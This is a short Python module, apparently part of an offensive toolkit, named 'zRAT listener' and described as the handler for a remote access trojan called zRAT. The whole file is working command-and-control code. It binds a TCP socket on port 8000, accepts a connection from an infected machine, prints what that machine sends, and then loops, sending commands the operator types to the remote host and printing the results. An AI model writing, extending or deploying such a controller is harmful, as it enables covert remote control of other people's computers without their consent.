import socket
class module:
    def __init__(self):
        self.listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.name = 'zRAT listener'
        self.description = 'The handler for zRAT'
        self.PORT = 8000
        self.help = 'PORT: The port to listen for connections'
    def main(self):
        self.listener.bind(('0.0.0.0',int(self.PORT)))
        self.listener.listen(1)
        conn,addr = self.listener.accept()
        print("Connection from: {}".format(str(addr)))
        while True:
            data = conn.recv(1024).decode('utf-8')
            if not data:
                break
            print(data)
            print(addr[0])
            message = input("Command: ")
            conn.send(message.encode('utf-8'))
            print(conn.recv(1024).decode('utf-8'))

    
